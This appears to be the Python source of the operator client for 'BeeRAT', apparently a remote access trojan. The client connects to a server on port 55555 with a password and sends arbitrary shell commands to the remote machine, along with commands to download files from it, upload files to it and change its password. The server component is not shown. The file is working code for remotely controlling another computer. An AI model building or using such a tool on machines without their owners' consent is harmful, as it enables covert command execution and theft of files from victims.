import base64
import getpass
import json
import os
import socket
import time
from typing import Any


FORMAT = 'utf-8'


class IncorrectPassword(Exception):
    pass


class Client:
    """this is a class that has all client related features
    """

    def __init__(self, ip: str) -> None:
        """the constructor for Client class

        Args:
            ip (str): ip address of the server
        """
        self.ip = ip

    def run(self) -> None:
        """run method of Client class (i.e. core of the app)
        """
        self.authenticate()
        # authentication was successful
        while True:
            try:
                # get the prompt from server ("$USER@$HOSTNAME:$PWD")
                self.send('prompt')
                info = self.recv()
                command = input(f'{info}$ ').split(' ')
                if command[0] == 'BeeRAT-help':
                    help_message = ('BeeRAT-help: display information about builtin commands\n'
                                    'exit: exit the shell\n'
                                    'clear: clear the terminal screen\n'
                                    'download: download file from server\n'
                                    '   usage: download [filepath]\n'
                                    'upload: upload file to server\n'
                                    '   usage: upload [filepath]\n'
                                    'downloadable: check if file is downloadable from server\n'
                                    '   usage: downloadable [filepath]\n'
                                    'BeeRAT-passwd: change BeeRAT server password\n'
                                    'pwd: print the name of the current working directory\n'
                                    'cd: change the shell working directory\n'
                                    'ls: list the files in current working directory\n')
                    print(help_message)
                elif command[0] == 'exit':
                    self.send('exit')
                    main()
                elif command[0] == 'clear':
                    self.clear()
                elif command[0] == 'download':
                    file_path = ' '.join(command[1:])  # extract file path from command
                    self.send(f'downloadable {file_path}')
                    downloadable = self.recv()
                    if downloadable:  # if file is downloadable from server
                        file_name = os.path.basename(file_path)  # extract file_name from file_path
                        self.send(' '.join(command))  # send the original command to server
                        file_content = self.recv()  # receive file content from server
                        print(self.write_file(file_name, file_content))  # write file content to file (save)
                    else:
                        print(f'download: {file_path}: Not downloadable')
                elif command[0] == 'upload':
                    file_path = ' '.join(command[1:])  # extract file path from command
                    if self.uploadable(file_path):  # if file is uploadable to server
                        file_name = os.path.basename(file_path)  # extract file_name from file_path
                        file_content = self.read_file(file_path)
                        self.send(f'upload {file_name}')  # server only needs to know the file_name
                        time.sleep(0.1)
                        self.send(file_content)
                        print(self.recv())  # print upload result
                    else:
                        print(f'upload: {file_path}: Not uploadable')
                elif command[0] == 'BeeRAT-passwd':
                    current_password = getpass.getpass('Current Password: ')
                    new_password = getpass.getpass('New Password: ')
                    renew_password = getpass.getpass('Retype new Password: ')
                    if new_password == renew_password:
                        if len(new_password) >= 8:
                            self.send(f'BeeRAT-passwd {current_password}')
                            if self.recv():
                                self.send(new_password)
                                if self.recv():
                                    print('[+] Password changed successfully.')
                            else:
                                print('[-] Current password is wrong.')
                        else:
                            print('[-] Password must be at least 8 characters long.')
                    else:
                        print('[-] Passwords dont match.')
                else:
                    command = ' '.join(command)
                    self.send(command)
                    result = self.recv()
                    print(result)
            except ConnectionResetError:
                print('[-] Server disconnected.')
                main()
            except Exception as e:
                print(str(e))
            except KeyboardInterrupt:
                pass

    def authenticate(self) -> None:
        """connect and authenticate with server

        Raises:
            IncorrectPassword: if password is incorrect
        """
        password = getpass.getpass('Password: ')
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.settimeout(3)
        self.client.connect((self.ip, 55555))
        self.client.settimeout(None)
        self.send(password)
        result = self.recv()
        if not result:
            self.send(None)
            raise IncorrectPassword
        print('[+] Connected.')

    def send(self, data: Any) -> None:
        """custom socket send method

        Args:
            data (Any): data that you wish to send
        """
        json_data = json.dumps(data)
        self.client.send(json_data.encode(FORMAT))

    def recv(self) -> Any:
        """custom socket recv method

        Returns:
            Any: data that you wish to receive
        """
        json_data = ''
        while True:
            try:
                json_data = json_data + self.client.recv(1024).decode(FORMAT)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def clear():
        """clear the terminal screen
        """
        return os.system('cls' if os.name == 'nt' else 'clear')

    @staticmethod
    def read_file(path: str) -> str:
        """read (i.e. upload) file

        Args:
            path (str): path to the file

        Returns:
            str: content of the file
        """
        with open(path, 'rb') as file:
            return base64.b64encode(file.read()).decode(FORMAT)

    def write_file(self, filename: str, content: str) -> str:
        """write (i.e. save, download) file

        Args:
            filename (str): name of the file
            content (str): content of the file

        Returns:
            str: file saved message
        """
        content = content.encode(FORMAT)
        filename = self.rename_file(filename)
        with open(filename, 'wb') as file:
            file.write(base64.b64decode(content))
            return f'[+] {filename} downloaded successfully.'

    @staticmethod
    def rename_file(file_name: str) -> str:
        """rename file if it exists

        Args:
            file_name (str): original file name

        Returns:
            str: new file name
        """
        filename, extension = os.path.splitext(file_name)
        counter = 1
        while os.path.exists(file_name):
            file_name = f'{filename} ({counter}){extension}'
            counter += 1
        return file_name

    @staticmethod
    def uploadable(file_path: str) -> bool:
        """check if file is uploadable

        Args:
            file_path (str): path to the file

        Returns:
            bool: result (True or False)
        """
        if os.path.isfile(file_path):
            return True
        if os.path.isfile(os.path.join(os.path.dirname(__file__), file_path)):
            return True
        return False


def main() -> None:
    """main function that runs the Client class
    """
    while True:
        try:
            command = input('BeeRAT-Client$ ').split(' ')
            if command[0] == 'help' and len(command) == 1:
                print('Commands:\n\t\thelp\n\t\tclear\n\t\tconnect [ip]\n\t\texit\n')
            elif command[0] == 'clear' and len(command) == 1:
                Client.clear()
            elif command[0] == 'exit' and len(command) == 1:
                exit()
            elif command[0] == 'connect':
                ip = command[1]
                client = Client(ip)
                client.run()
            else:
                print('[-] Unknown command.')
        except (ConnectionRefusedError, TimeoutError):
            print('[-] Connection failed.')
        except (KeyboardInterrupt, EOFError):
            exit()
        except IncorrectPassword:
            print('[-] Password is incorrect.')
        except Exception as e:
            print('[-] Invalid ip.')


if __name__ == '__main__':
    main()
